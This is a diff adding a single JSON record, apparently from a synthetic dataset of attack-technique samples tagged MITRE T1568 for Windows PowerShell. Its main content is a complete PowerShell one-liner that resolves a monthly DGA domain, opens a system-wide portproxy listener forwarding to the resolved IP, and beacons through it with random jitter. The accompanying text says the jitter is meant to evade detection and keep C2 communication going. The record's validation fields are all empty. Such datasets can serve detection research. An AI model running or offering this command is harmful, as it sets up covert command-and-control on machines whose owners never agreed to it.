@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$base='edge'+(Get-Date -Format 'yyyyMM')+'.cc';$port=4433;for($i=0;$i -lt 3;$i++){try{$answers=Resolve-DnsName $base -Type A -ErrorAction Stop;$ip=($answers|Get-Random).IPAddress;netsh interface portproxy set v4tov4 listenaddress=0.0.0.0 listenport=$port connectaddress=$ip connectport=443;Invoke-WebRequest -Uri ('http://127.0.0.1:'+ $port +'/hb') -UseBasicParsing -Headers @{Dom=$base;Tip=$ip} -TimeoutSec 5;Start-Sleep -Seconds (Get-Random -Min 20 -Max 57)}catch{Start-Sleep -Seconds 7}}",
+  "explanation": "Continuously re-resolves a monthly DGA domain and updates a system-wide portproxy listener to whichever IP is currently active, beaconing with jitter to reduce detection.",
+  "rationale_steps": [
+    "Use periodic re-resolution with randomized selection among A records.",
+    "Keep portproxy synchronized with the dynamic endpoint to sustain C2 communication."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-4fdd61a2",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
